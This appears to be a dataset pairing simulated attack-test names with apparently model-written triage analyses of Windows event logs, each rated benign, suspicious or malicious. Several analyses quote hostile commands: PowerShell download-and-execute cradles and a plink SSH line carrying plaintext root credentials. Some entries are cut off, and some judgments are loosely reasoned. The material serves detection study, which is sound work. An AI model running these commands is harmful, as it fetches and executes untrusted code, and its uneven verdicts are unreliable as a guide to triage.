   - The PowerShell log events indicate the execution of a script that recursively enumerates files in user directories (Desktop, Downloads, Documents, AppData/Local, AppData/Roaming) and appends the output to a temporary file (`dataTest5.txt`). This script is run silently, catching errors without notification. This pattern of behavior can be associated with data reconnaissance or exfiltration attempts, as it involves collecting data from multiple user-focused directories across the system.

2. **Sysmon Activity**:
   - The Sysmon logs show repetitive executions of `wevtutil.exe` and `conhost.exe` by the user ""SERVER002\\admin_test"". While these processes themselves can be legitimate, their repetitive invocation, especially in the context of `wevtutil.exe`, could indicate attempts to tamper with or query event logs.
   
3. **Edge Update Activity**:
   - The logs across different sections show numerous executions related to Microsoft Edge Update processes. Such activity can typically be benign and related to updating or maintaining Edge browser functionalities. However, the unconventional execution trace of MicrosoftEdgeUpdateSetup.exe from the `C:\Program Files (x86)\Microsoft\Temp\` directory does raise suspicions, as the setup execution is expected in official directories.

### Assessment:

- **PowerShell Usage**: The use of PowerShell for recursively enumerating directories and cataloging files is a red flag. This script could be the result of malicious intent aimed at preparing data for exfiltration.
  
- **Sysmon Entries**: The repeated execution of `wevtutil.exe` could suggest tampering with event logs to cover tracks, especially when combined with the execution of PowerShell scripts for gathering file information.

- **Edge Update Processes**: While the Edge update processes usually indicate routine application updates, unusual executions from temporary directories should be further investigated to rule out the possibility of malware camouflaged as a legitimate process.

### Resolution:
- **Resolution: SUSPICIOUS**: The analysis of event logs presents activities that warrant further investigation. The PowerShell script signifies potential reconnaissance or exfiltration motives, while the unusual execution of system utilities and Edge Updates requires validation to ensure no foul play. It's crucial to trace the source and intent of the PowerShell script and further review for any unapproved changes or scheduled tasks on the system.

### Recommended Next Steps:
1. **Investigate PowerShell Execution**: Identify the source and reason for the PowerShell script execution. Check any scheduled tasks or triggers that initiated the script and confirm with the user/system owner.
   
2. **Review User Activities**: Corroborate activities under the ""SERVER002\\admin_test"" account to detect any unauthorized access or privilege misuse. Focus especially on admin users, since modifying system logs is accessible to privileged users.

3. **Validate Edge Update Events**: Verify the legitimacy of Edge update processes and the paths of executable files involved. Look for known indicators of compromise related to these processes.

4. **Comprehensive Threat Detection**: Utilize anti-malware solutions to scan the system for potential threats, focusing on the most suspicious directories and temporary files created during the timeframe of these logs. 

5. **Audit Firewall and Network Traffic**: To further strengthen this investigation, audit the network traffic for suspicious connections or large data transfers. This could help identify any data exfiltration attempts in progress. 

Performing these steps will provide clarity on the nature of these findings and whether they truly point to a potential security breach."
System Service Discovery,"Upon examining the provided Windows event logs, here are the findings:

### System Log

- **Event ID 44 & 43 (Windows Update Client)**: These events note that the system has attempted and then succeeded in applying a security intelligence update for Microsoft Defender Antivirus. This is regular, expected behavior as part of Windows maintaining its security definitions.

### Security Log

- **Event ID 5379 (Security-Auditing)**: These events relate to credential access using Microsoft Account and WindowsLive with repeated failures (ReturnCode = 3221226021 indicates ""STATUS_LOGON_FAILURE""). These failed attempts are somewhat concerning as they reflect repeated attempts to access account details, potentially indicating an unauthorized access attempt or misconfiguration.

### Sysmon Log

- **Event ID 1**:
  - **Processes like `wmiprvse.exe`**: Refers to WMI Provider Host, which is a legitimate Windows process used for system management tasks.
  - **`wevtutil.exe` and `conhost.exe` initiated by `admin_test`**: Usage of `wevtutil.exe` (Windows Events Command Line Utility) by a user account, especially an admin account, could mean an attempt to enumerate or manipulate event logs, though additional context is needed to determine the intent.

- **`HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` commands**: These may indicate reconnaissance activity especially in conjunction, indicating the user is checking system and session information, and querying tasks and service information using `tasklist.exe` and `sc.exe`.

- **Command: `cmd.exe /c tasklist.exe & sc query & sc query state= all`**: This pattern of command execution is consistent with enumerating services and processes, which could be benign administrative activity or preparatory steps for malicious activity.

### Assessment

- **Potential Risk Areas**:
  - The consistent execution of commands that list processes and query services could signify reconnaissance operations often seen in the early stages of a compromise.
  - The failed credential access attempts could suggest a brute-force attempt to access accounts using Microsoft credentials or it could be a result of stale/inactive accounts attempting reconnection. 

- **Indicators of Misuse**:
  - The invocation of system utilities `wevtutil` and `sc.exe` by `admin_test` might represent privilege misuse unless verified as legitimate administrative actions.
  - Usage patterns and account activities could match lateral movement or persistence tactics.

### Resolution
Based on the analysis of the logs:

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed

1. **Further Investigation**:
   - Verify the legitimacy of the commands executed by `admin_test`. Determine if these are part of scheduled administrative tasks or unrecognized manual inputs.
   - Confirm that the failed logon attempts using Microsoft Account credentials are intentional and legitimate in correlation with any account lockouts.

2. **Threat Mitigation**:
   - Conduct a security audit of accounts and enforce multi-factor authentication across users accessing sensitive systems.
   - Review group policies specific to command-line tool usage and refine monitoring alerts to detect unusual command execution in real-time.

3. **Monitoring & Response**:
   - Increase the logging detail level for key hosts suspected to have exposure to suspicious activity, leveraging Sysmon for granular details.
   - Establish a baseline of normal behavior for system processes and regularly audit for deviations.

The logs indicate areas that may require closer surveillance and possible internal policy reinforcement to secure the network environment."
Get-EventLog To Enumerate Windows Security Log,"### Analysis of Windows Event Logs

#### Suspicious/Anomalous Behavior:

1. **Repeated SYSTEM Logons (Event ID 4624) and Privileges (Event ID 4672):**
   - Multiple log entries show SYSTEM logons with high privileges in quick succession. Legitimate system processes often log these, but for a single user or session, rapid and repeated events can be indicative of a scripted or automated process.

2. **Credential Validation Failures (Event ID 5379):**
   - Numerous credential validation attempts for a MicrosoftAccount user that failed (ReturnCode: 3221226021) are observed. These could represent an automated or scripted attack trying to access accounts improperly.

3. **Process Creation with Administrative Commands (Sysmon Event IDs 1 and 5):**
   - Execution of administrative commands like `wevtutil`, `whoami`, `conhost`, and multiple instances of `powershell.exe`.
   - The use of `powershell.exe` with encoded commands, particularly those querying and exporting security logs. This often embodies an attempt to conceal malicious actions or harvest logs for offensive purposes.

4. **Parent-Child Process Relationships:**
   - The process creation logs include legitimate Windows processes (e.g., `CompatTelRunner`, `svchost`, `taskhostw.exe`), but their repeated and rapid invocation, especially in tandem with the above logs, is suspect.
   - PowerShell executing commands to extract logs using specific filters, indicative of data exfiltration attempts.

5. **Potential Log Tampering/Surveillance:**
   - The execution of `wevtutil`, often used to manage event logs, in conjunction with the observed PowerShell activity on querying event logs for SYSTEM entities, suggests potential surveillance or log tampering.

#### Indicators of Malicious Activity:

- The presence of encoded PowerShell commands handling security logs, especially when in high privilege contexts.
- Credential access attempts for online Microsoft accounts without success, potentially indicating lateral movement attempts or recon operations.
- The rapid and repeated chain of administrative operations carried through both native Windows tools and script execution.

### Assessment

Based on the observed log events and identified suspicious activities, the behavior showcased across the logs is more indicative of a **MALICIOUS** attempt. The automated, repeated, and unauthorized querying of sensitive logs, alongside credential failures, suggest an effort to access or exfiltrate information without prior permission. Coupled with the absence of any benign explanations within the provided context—such as automated Windows Update or backup tasks—these elements are typically associated with unauthorized or malevolent activities.

### Resolution

**MALICIOUS**

### Guidance and Next Steps

Enumerate all accounts via PowerShell (Local),"### Detailed Analysis of the Logs

Upon analyzing the provided logs, several observations can be made:

#### System Logs
- The kernel general and time service events indicate a change in system time which could be legitimate system activities or an attempt to manipulate logs. However, there is no direct evidence of malicious intent just from the time changes themselves.

#### Security Logs
- Multiple `EventID: 4799` and `EventID: 5379` entries involving `powershell.exe` executed by the user `admin_test` indicate membership changes and potential enumeration of system accounts and groups. Excessive group enumeration could indicate reconnaissance, which is often part of initial access or lateral movement phases of an attack.
- Powershell commands executed include listing users, local groups, group members, and credentials via `cmdkey.exe`, which could point to a script capturing user and access details.

#### Sysmon Logs
- The use of `powershell.exe` in conjunction with commands to enumerate users and groups, as well as `cmdkey.exe /list` indicates likely reconnaissance activity.
- There is extensive execution of system utilities like `whoami.exe`, `conhost.exe`, `hostname.exe`, and `wevtutil.exe`, accompanied by PowerShell activities, which can be part of legitimate admin operations but can also be indicative of suspicious behavior depending on the context.
- Record of process creation events indicates normal system activities (like Edge updates) but should be correlated with known activity periods as they can mask suspicious actions.
- The sequence and pattern of `net.exe` and `net1.exe` usage for querying user and group information indicates potential lateral movement or preparation for privilege escalation.

#### PowerShell Logs
- PowerShell execution of potentially benign commands wrapped together indicates script execution for enumeration tasks. Such scripts are commonly used by attackers during reconnaissance.

#### Application Logs
- The application logs primarily show service stop/start which could be related to regular maintenance activities.

### Assessment of the Situation

- **Suspicious Behavior**: There's a pattern of reconnaissance and enumeration activities using PowerShell, elevated privilege context, and system commands which are indicative of potential preparatory actions by an attacker or unauthorized user activity on the system. Although no definitive malicious actions (e.g., known malware signatures, specific privilege escalation) are apparent within the logs, the behavior of extensive user and group enumeration coupled with certain PowerShell scripts and `cmdkey` usage falls into a suspicious category.

### Resolution

**Resolution: SUSPICIOUS**

The activity warrants further investigation due to:
- Potential reconnaissance activities.
- Unusual frequency and nature of system identity and group enumeration, especially on a CEO's machine where such activity is less expected under normal conditions.
- Usage of PowerShell and other administrative tools that could indicate the presence of exploitation attempts or scripts.

### Guidance on How to Proceed

1. **Review User Activity**: Confirm whether the user `admin_test` authorized these PowerShell sessions and associated activities.
2. **Network and System Monitoring**: Implement monitoring for any anomalous outgoing network connections or unusual process activities.
3. **Cross-reference with Threat Intelligence**: Check for any correlations between these observed activities and known threat actor tactics, techniques, and procedures (TTPs).
4. **Conduct File and Memory Analysis**: Investigate the machine for any suspicious files or memory artifacts not covered by the logs.
5. **Privilege Use and Access Review**: Ensure that administrative accounts and privileges align with policy and there are no unexplained privilege grants.
6. **Consider Isolation or Segmentation**: If linked to corporate assets, initiate steps to isolate the affected systems from sensitive parts of the network while maintaining business continuity."
Azure - Dump Subscription Data with MicroBurst,"Upon analyzing the provided Windows event logs, several observations can be made that indicate suspicious and potentially malicious behaviors:

1. **PowerShell Execution:**
   - The Sysmon and PowerShell logs show evidence of PowerShell scripts being executed. Notably, PowerShell scripts like `Get-AzDomainInfo.ps1` are being imported and executed using obfuscated and suspicious command lines. These events are logged with a user context of `SERVER002\admin_test`, which indicates potential privilege abuse or elevation exploits.
   - The command lines include processes that convert strings to secure strings and utilize credentials with empty usernames, suggesting possible intent to execute malicious scripts with elevated permissions and evade detection.

2. **Frequent Usage of `CompatTelRunner.exe`:**
   - The logs repeatedly reference `CompatTelRunner.exe`, which is a legitimate Microsoft Telemetry tool, but it appears to be running commands and accessing various user accounts and SIDs, including privileged accounts like `Administrator` and `admin_test`. This unusual usage may be indicative of process masquerading or exploitation for privilege escalation or data exfiltration.

3. **Multiple Unauthorized User Account Access:**
   - The Security logs show access attempts to multiple accounts, such as `Guest`, `Administrator`, `DefaultAccount`, and other non-standard accounts (`admin_test`, `lplui`, `sshd`, etc.), through `CompatTelRunner.exe`. This behavior is unusual and suggests potential account enumeration or unauthorized access attempts.

4. **Command Line Activity Involving Edge Installers:**
   - The logs have several instances of Microsoft Edge related setup and installer executables running with numerous command-line arguments, some containing entries like `--do-not-launch-msedge` and `--verbose-logging` in a system-level context. While this could relate to legitimate software updates, the frequency and combination of arguments can also signal misuse or potential packaging with unwanted behaviors.

5. **Command Execution from Suspicious Directories:**
   - Executions from temporary directories, such as `C:\Users\ADMIN_~1\AppData\Local\Temp\`, particularly with complex command lines and credential handling, are signatures often associated with malicious activity like malware installation or system configuration modification.

**Assessment and Conclusion:**
Given the combination of suspicious PowerShell activity, repeated unusual execution of potentially exploitable binaries like `CompatTelRunner.exe`, and account enumeration or possible privilege exploitation, the activities in the logs lean towards being potentially malicious. The evidence suggests that an insider or malware is attempting to execute unauthorized scripts and gain higher-level system access.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the affected machine (Server002) from the network to prevent further unauthorized access.
  - Perform a detailed forensic investigation to identify the full extent of compromise and the potential exfiltration of sensitive data.
  
- **Long-term Actions:**
  - Strengthen security protocols around PowerShell execution, implementing strict policies and logging.
  - Regularly audit user accounts and their permissions, with a focus on identifying and securing non-standard and administrative accounts.
  - Monitor for unusual software installations or updates, particularly those involving command-line executions on sensitive systems."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"### Analysis:

Upon reviewing the provided event logs, the following key observations and concerns were noted:

1. **PowerShell Invocation (Sysmon and PowerShell Logs):**
   - A PowerShell script was executed via the command line containing the `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')` command.
   - This command is downloading and executing a script directly from a remote URL, which is a red flag for malicious behavior. This technique is often used in attacks for fileless malware execution and bypassing traditional defenses.

2. **Processes and Commands (Sysmon Log):**
   - The execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `PowerShell.exe` frequently in such a short period, and the association with suspicious PowerShell activity raises concerns.
   - The presence of `conhost.exe` with the `-ForceV1` argument can be indicative of misuse, often aligned with malicious intent.

3. **Suspicious Activity Indicators:**
   - The use of PowerShell with a high integrity level further corroborates administrative or escalated privileges, typically sought in attacks.
   - The execution chain seen in the logs (`wsmprovhost.exe` spawning processes such as `hostname.exe`, `whoami.exe`, and PowerShell) suggests potentially malicious lateral movement or enumeration activities being performed.

4. **Time Discrepancy Events (System Log):**
   - There were adjustments made to the system time by `svchost.exe`, though this alone might not be malicious, combined with other logs, it deserves further investigation to understand any intent to evade logs/timestamps.

5. **Routine Updates (Sysmon Log):**
   - Noticing logs related to Microsoft Edge Update, such as `MicrosoftEdgeUpdate.exe`, appears legitimate, associated with routine application updating processes, though the suspicious entries should not be overshadowed by these benign activities.

### Assessment:
The combined analysis of these behaviors, particularly the direct PowerShell script download and execution, the frequent spawning of system processes often used in enumeration or system information gathering, and the potential misuse of high-integrity PowerShell sessions, strongly suggest that there may be malicious activity or a potentially compromised system.

### Threat/Risk:
There is a high risk that the machine was compromised, potentially by a network script or a fileless malware attack using PowerShell. The remote script download and execution approach are particularly concerning, as it can lead to extensive system compromise.

### Guidance:
1. **Immediate Mitigation:**
   - Isolate the affected host from the network to prevent potential further spread of any malicious code.
   - Conduct an in-depth forensic analysis on the machine to identify any additional indicators of compromise.
   - Review network logs for any outgoing connections related to the suspicious URLs and deactivate them if necessary.

2. **Further Investigation:**
   - Identify the user `SERVER002\\admin_test` to verify the legitimacy of these actions.
   - Assess the downloaded content from the PowerShell commands to determine the payload and potential damage or data exfiltration.
   - Conduct a scan of the network for any signs of this behavior spreading to other systems.

3. **Preventive Measures:**
   - Implement advanced threat detection solutions, such as continuous PowerShell command logging (with deep analysis) and EDR solutions for rapid response.
   - Conduct regular security awareness training for users on identifying and avoiding phishing and other attack vectors.

### Resolution:
**MALICIOUS** - The logs contain activity that is indicative of malicious behavior, specifically due to the nature of the PowerShell script execution linked to a potentially malicious remote URL."
Enumerate logged on users via CMD (Domain),"Based on the logs provided, let's analyze each of them to identify any suspicious or malicious activities:

### Analysis

#### Windows System Log
1. **Kernel-General Events (EventID: 1 & 24)**:
   - These events are standard logs related to the system time changes typically executed by legitimate system processes like `svchost.exe`. The time adjustments are small (milliseconds) and seem to be synchronization events which are common.

2. **Time-Service Event (EventID: 35)**:
   - The system had synchronized its time with `time.windows.com`. This appears normal for a Windows environment.

#### Application Log
1. **SPP (Software Protection Platform) Event (EventID: 16384)**:
   - This log entry pertains to the Windows Software Protection Platform Service. It does not appear suspicious as it is a routine activity.

2. **EdgeUpdate Events**:
   - These log entries show the stopping of the Edge Update service, which could happen as part of normal service management.

#### Security Log
1. **Security-Auditing Events (EventID: 4616)**:
   - These relate to the system time changes, representing legitimate activity where time synchronization or adjustments occurred.

#### Sysmon Log
1. **Process Creation Events (EventID: 1 & 5)**:
   - Multiple instances of processes like `wevtutil.exe`, `cmd.exe`, `whoami.exe`, `hostname.exe`, and components of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are noted.
   - `wevtutil.exe`, `whoami.exe`, and `hostname.exe` are legitimate administrative tools, their appearance might indicate typical administrative operations unless paired with known malicious patterns.
   - significant activity surrounding `MicrosoftEdgeUpdate.exe` and related executables. The logs show `EdgeUpdate` executing several updates and service checks which are usual tasks for software update mechanisms.
   - The processes are executed under ""NT AUTHORITY\SYSTEM"" or as ""SERVER002\admin_test"", using expected paths. However, the use of these processes and the frequency they appear in the logs may warrant further investigation if out of the ordinary based on historical baseline operations.

### Assessment and Resolution

1. **Anomalous Behavior**: Logs indicate time changes which are standard for syncing operations. Administrative tools are used frequently, but they appear under legitimate paths and users.
2. **Indications of Compromise**: No direct evidence of malware or compromise. The Sysmon log showing several `cmd.exe` and administrative executable operations could imply maintenance or legitimate updates unless context shows otherwise.
3. **Risks**: Minimal risk based on available logs showing typical administrative and update patterns.

### Conclusion

**Resolution: BENIGN**

- The logs exhibit benign activity, likely associated with typical system time synchronization and legitimate administrative tasks. There is no direct evidence of malicious activity or compromise. If admin-tool usage frequency is not typical based on historical usage patterns, a closer review of the session actions from the 'admin_test' account and activities surrounding Edge software updates could further contextualize the events. Continue monitoring for patterns divergent from expected operational behavior."
WMIObject Group Discovery,"### Analysis of the Windows Event Logs

**1. Windows PowerShell Logs:**
- **PowerShell Execution:** Multiple events log the start of various providers like Registry, Alias, Environment, etc., from a PowerShell instance with a command line: `powershell.exe & {Get-WMIObject Win32_Group}`. This command itself is not malicious; it queries local groups on the system.
- **Observation:** While the command `Get-WMIObject Win32_Group` typically retrieves group information, its execution in a high-integrity context can sometimes indicate a scripted reconnaissance effort; however, it is a standard administrative command.

**2. Sysmon Logs:**
- **Process Execution:** The logs show execution of common utilities like `whoami.exe`, `conhost.exe`, `hostname.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`.
- **Integrity Level:** The processes run with a 'High' integrity level.
- **Parent Process:** Several processes are spawned under a parent process `wsmprovhost.exe`, indicating they might be part of legitimate Windows Management Instrumentation (WMI) activity.
- **Events with `whoami` and `hostname`:** These commands display current user and system information which can be typical for scripts or administrators verifying system state.
- **Conhost and Wevtutil:** These are standard Windows processes used for console applications and managing event logs, respectively. Their occurrence in logs doesn't inherently indicate malicious activity.

**3. Security Logs:**
- **Logon Events:** Several 4624 events indicate successful logons using NTLM. The user `admin_test` was granted high-level privileges (`SeDebugPrivilege` among others), typical for an administrative account.
- **Privileged Operations:** The presence of high privileges being exercised (4672 events) may be normal for an admin user, but it warrants attention to ensure these privileges were intended for current operations.

**4. Application Logs:**
- No particularly suspicious activity is directly highlighted in the provided logs.

### Assessment of the Situation

- **Suspiciousness:** The observed activities are carried out by a high-privilege user and involve commands that are part of normal administrative operations. However, the use of administrative tools, especially in quick succession or as part of a scripted process, can sometimes indicate an attempt to gather information from the system in preparation for further actions.
  
- **No Clear Malicious Indicators:** Despite the potentially suspicious context (administrative privilege use), there is no explicit indication of malicious payload delivery or execution within these logs.

### Resolution and Guidance

- **Resolution:** **SUSPICIOUS**
- **Guidance:**
  - **Further Investigation:** Validate the necessity of these commands during the time of execution. Check if the administrative actions correlate with any legitimate user requests or system maintenance.
  - **User Verification:** Verify with the user `admin_test` if these activities were recognized and legitimate.
  - **Monitor:** Continue monitoring this host for any changes in behavior or any new unexpected activities.
  
Due to the high privilege level of the user and the nature of the commands executed, it's advised to consider this activity as suspicious and investigate further to ensure the integrity and security of the system."
Security Software Discovery - Windows Defender Enumeration,"After analyzing the provided event logs from various Windows event sources, here are the findings:

### **Windows PowerShell Log:**

The PowerShell events indicate the execution of a series of commands designed to check the status of Windows Defender. Specifically, these commands include:
- `Get-Service WinDefend`
- `Get-MpComputerStatus`
- `Get-MpThreat`

This sequence of PowerShell commands is typical for checking antivirus status and threat details and can be deemed routine for maintenance or audit purposes. Since this is on the system identified as ""Server002,"" it may be an automated health check or a manual one performed by an administrator or scheduled task.

### **System and Security Logs:**

These logs record a time adjustment event (`EventID: 1`), suggesting the system time was changed to sync with `time.windows.com`. This usually happens through legitimate Microsoft services to synchronize the system clock. There's no indication of malicious intent associated with these entries, as it's a standard operation for maintaining time accuracy across systems.

### **Sysmon Log:**

The Sysmon logs show a variety of process creations and executions, primarily involving regular system utilities and processes typically associated with system administration:
- Execution of `whoami.exe` and `hostname.exe` commands, likely for user verification and system identification.
- Numerous instances of Microsoft Edge Update processes, indicating regular software update procedures. The execution of processes like `MicrosoftEdgeUpdateSetup_X86` and related helpers shows Edge updating activities.

### **Application Log:**

Logs from the application channel include regular software protection platform service messages and edge update service stop messages.
- The Software Protection Platform Service log entry (`EventID: 16384`) is routine and not unusual.
- Edge update stops are typical post-update processes, indicating a normal conclusion of automatic update tasks.

Basic Permission Groups Discovery Windows (Domain),"### Analysis of the Provided Windows Event Logs

#### Observations:

1. **Sysmon Logs**:
   - Multiple entries for the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil` utility is used for managing event logs and could be used in normal administration. However, frequent and sequential execution of this tool with similar timing could indicate log manipulation or evasion attempts.
   - The execution of `cmd.exe` with command line arguments querying various groups including ""enterprise admins"" and ""domain admins"" by `SERVER002\admin_test`. This kind of activity can be associated with reconnaissance or privilege escalation attempts.

2. **Security Logs**:
   - Timechange events (Event ID 4616) indicate modifications to the system time. The entries suggest these might be related to legitimate synchronization (as indicated by Time-Service logs) but should be further scrutinized, especially if observed alongside other suspicious behavior.

3. **System Logs**:
   - Similar time change events are captured here and suggest legitimate NTP synchronization activities, although these often accompany certain types of lateral movement or evasion tactics by adversaries.

4. **Application Logs**:
   - A benign log entry from the Software Protection Platform Service (SPP) related to licensing.

#### Indicators of Malicious Activity or Compromise:

- The frequent execution of administrative command and network-related tools (`wevtutil`, `cmd.exe`, `net.exe`, and `net1.exe`) by a single user (`SERVER002\admin_test`) within a short timeframe could suggest an attempt to gather information regarding privileged groups or conduct unauthorized administrative tasks.
  
- Although legitimate for administration, without a clear justification for the timing and frequency of these commands, they can be employed maliciously for reconnaissance or to manipulate logs for covering tracks.

- The command querying the membership of privileged groups (`enterprise admins`, `domain admins`) is suspicious unless justified by sanctioned administrative tasks.

### Assessment:

- **SUSPICIOUS**: The combination of actions, particularly the enumeration of domain and enterprise admin groups, frequent usage of `wevtutil`, and time-changing events alongside elevated Privileges with High Integrity Level indicates activities that deviate from typical administrative behavior. These actions warrant further investigation to rule out potential misuse or malicious intent.

### Guidance:

1. **Immediate Actions**:
   - Verify the intent and authorization of the user `SERVER002\admin_test` for these activities.
   - Review any corresponding network or endpoint detection and response (EDR) logs to identify any correlated alerts or incidents.
   - Conduct a deeper investigation into other machines for any similar activities, focusing on lateral movement patterns.

2. **Further Investigation**:
   - Analyze user behavior and access logs on Server002 for context around these actions.
   - Check account activity logs to ensure the account `admin_test` hasn't been compromised.

3. **Recommendations**:
   - Implement tighter monitoring on privileged accounts and use tools like Sysmon to enhance visibility.
   - Review and possibly enrich detection rules that can alert on enumeration and unusual usage of network and system tools.
  
The given logs suggest activity that might be explained through benign use of administrative tools, but the context and pattern hint at the need for a more thorough investigation to ascertain motive and potential security impact."
ESXi - Enumerate VMDKs available on an ESXi Host,"Upon analyzing the provided Windows event logs from the CEO's machine, here is a detailed examination:

1. **Unusual Process Execution and Command-Line Arguments:**
   - Several processes of concern include `powershell.exe`, `wevtutil.exe`, and `conhost.exe`, all executed by the user `SERVER002\admin_test`. These processes could potentially be used for malicious purposes, such as PowerShell being utilized for scripting attacks or `wevtutil.exe` to clear event logs.
   - Notably, there is a suspicious command line executed by `cmd.exe`, involving the `plink.exe` binary which is known for enabling SSH connections. The command line includes SSH credentials in plaintext and points to a local file intended for file discovery on remote systems: 
     ```
     ""cmd.exe"" /c echo """" | ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\plink.exe"" ""file.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\esxi_file_discovery.txt""
     ```

2. **Potential Privilege Escalation:**
   - The processes running with `High` integrity level executed by the `admin_test` user indicate potentially elevated privileges being used, which could suggest either legitimate administrative tasks or potentially malicious actions if these activities are unusual for this user.

3. **Indicators of Potentially Malicious Activity:**
   - Execution of `plink.exe` to establish outbound SSH connections with explicit credentials is highly indicative of unauthorized data exfiltration or unauthorized remote access.
   - The sequence of processes including PowerShell and `wevtutil.exe` can suggest clearing of logs or system manipulation, common in malicious intrusions to cover tracks.

4. **Edge Update Processes:**
   - The repeated instances of `MicrosoftEdgeUpdate.exe` processes seem to be related to legitimate update services for Microsoft Edge. However, the frequent instantiation and stopping of services within a short time frame could warrant further examination to ensure they aren't being used in conjunction in a compromise scenario.

5. **General Concerns:**
   - The logs do not show any activity in the Windows PowerShell, System, and Security logs sections, which could suggest anomalies in log collection or potentially cleared logs.

### Assessment and Resolution:

Based on the detailed analysis, the activity surrounding the use of `plink.exe` with embedded SSH credentials, along with the usage of PowerShell and potentially log-clearing utilities like `wevtutil.exe`, is suspicious. These actions may suggest malicious intent aiming for data exfiltration, remote access, or obfuscation of other malicious activities.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Immediate Action:**
   - Isolate the CEO's machine from the network to prevent any further potential data exfiltration or spread.
   - Change any credentials and access details that may have been exposed during this process, especially SSH keys or passwords.
   
2. **Further Investigation:**
   - Review full memory dumps and network traffic from the timeline of these logs for additional indicators of compromise.
   - Conduct a thorough analysis of related user activities and correlate with known legitimate actions or confirmed threats.
   
3. **Long-term Recommendations:**

   - Enhance the security posture with regular user training on recognizing and preventing phishing or unauthorized access attempts.

By considering these steps, we aim to safeguard the organization's systems effectively while addressing the identified suspicious activity."
WinPwn - spoolvulnscan,"In analyzing the provided Windows event logs, several potentially suspicious activities and anomalies stand out. Below is a detailed breakdown:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are logged. Wevtutil is often used for querying and interacting with Windows event logs, which might be normal in certain administrative tasks, but frequent, repeated use could indicate log tampering or data exfiltration attempts. 

2. **Execution of `whoami.exe` and `hostname.exe`:**
   - While these utilities are legitimate and used to gather system information, their execution should be monitored as they can be used by malicious actors to gather details about the system environment during reconnaissance.

3. **Suspicious Use of PowerShell:**
   - The execution of PowerShell with a command-line pattern that includes downloading and executing a script from an external URL (`https://raw.githubusercontent.com`) is highly suspicious. This indicates a potential attempt to execute a remote script using PowerShell which is a common method used by attackers for remote code execution.
   - Command: `powershell.exe & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), spoolvulnscan -noninteractive -consoleoutput}`

4. **Time Manipulation Activity:**
   - Security logs indicate an adjustment of system time through `svchost.exe`. Time changes can be benign if related to synchronization tasks, but they may also serve as a tactic to evade detection by interfering with time-stamped log entries.

5. **Use of Microsoft Edge Update Components:**
   - There is repeated activity associated with `MicrosoftEdgeUpdate.exe` and related installations. While updating is a normal process, excessive or unexplainable activity warrants further scrutiny to rule out abuse or exploitation.

6. **No Direct Privilege Escalations Detected:**
   - The logs do not explicitly detail any privilege escalation attempts. This observation, however, should not rule out the potential for non-logged escalation attempts or pivots to other systems.

Given these observations, the overall assessment of the logs points to:

**Resolution: MALICIOUS**

- The PowerShell activity is particularly concerning and indicative of malicious intent or compromise, as using PowerShell to execute scripts from remote repositories is a common technique employed by threat actors.
- Immediate incident response actions should be initiated, focusing on:
  - Isolating the machine from the network to prevent further propagation.
  - Conducting a deeper forensic analysis to determine the extent of the compromise.
  - Reviewing other systems for similar suspicious activities or indicators of compromise.
  - Updating threat intelligence with any newly discovered indicators for proactive defense and monitoring.

This analysis concludes that there is a high likelihood of a security breach, necessitating urgent intervention and investigation."
Enumerate COM Objects in Registry with Powershell,"Upon reviewing the given logs, we will analyze the sequences for any signs of unusual or potentially malicious activity, focusing on: unusual process executions, privilege escalations, command-line executions, and other signs of unauthorized access or behaviors.

### Analysis:

1. **Windows Updates**:
   - **System Log Events 43, 44, 19**: Reflect a regular update operation conducted by the Windows Update Client for updating Microsoft Defender Antivirus. These logs indicate normal behavior related to system updates and do not suggest malicious activity.

2. **DCOM Error**:
   - **EventID 10010 in System Log**: Indicates a DCOM launcher issue which generally signifies a configuration or application issue rather than malicious activity. This requires configuration attention but isn’t immediately indicative of a breach.

   - **Event Logs (4624, 4672)**: Indicate SYSTEM user logons (LogonType 5) which denote service logins. The privileges listed (e.g., SeDebugPrivilege) are typical for SYSTEM account sessions.
   - **Frequent Security Logs 5379**: Suggest repeated attempts at using credentials or tokens related to Microsoft Accounts. ReturnCode 3221226021 suggests a failed access attempt. This could be suspicious if unexpected but might represent misconfiguration or incorrect credentials handling.

4. **PowerShell Activity**:
   - **PowerShell Logs**: Indicate a script running that mounts a registry drive and iterates through CLSIDs. This could be a normal administrative activity. However, without more context (what exactly it is doing with those CLSIDs), this can appear suspicious since it involves operations that could be leveraged for reconnaissance or complex attacks.

5. **Sysmon Events**:
   - **Process Executions**: Several legitimate processes and binaries (e.g., `whoami.exe`, `powershell.exe`, `svchost.exe`) are executed. `wevtutil.exe` and references to WinRM (e.g., `winrshost.exe`) might suggest the system is gathering or viewing event logs, which is a legitimate administrative task, or it could raise suspicions if not expected.
   - **Edge Update Processes**: Indicate normal browser update activities.

### Conclusion:

- **Potential Issues**: Frequent and failed credential/token accesses related to Microsoft accounts, along with PowerShell activities involving registry CLSID enumeration—these need more investigation to rule out misuse or intentional reconnaissance efforts.
- **Positives**: Regular updates and a SYSTEM account having typical privileges may reaffirm legitimate maintenance activities.

### Threat Assessment:

- **Resolution**: **SUSPICIOUS**
  - **Reasoning**: While no direct evidence of compromise is observed, some activities (failed credential attempts, PowerShell scripts with potential for misuse) require further investigation to confirm their intentions and confirm legitimacy.

### Recommendations:

1. **Monitor & Investigate**:
   - Gather context on the PowerShell scripts' intent and cross-verify with logged administrative tasks.
   - Investigate frequent failed attempts with Microsoft account tokens to discern whether they're benign or indicative of unauthorized access attempts.

2. **Harden Configurations**:
   - Ensure that PowerShell execution policies are set to constrain unauthorized script running.
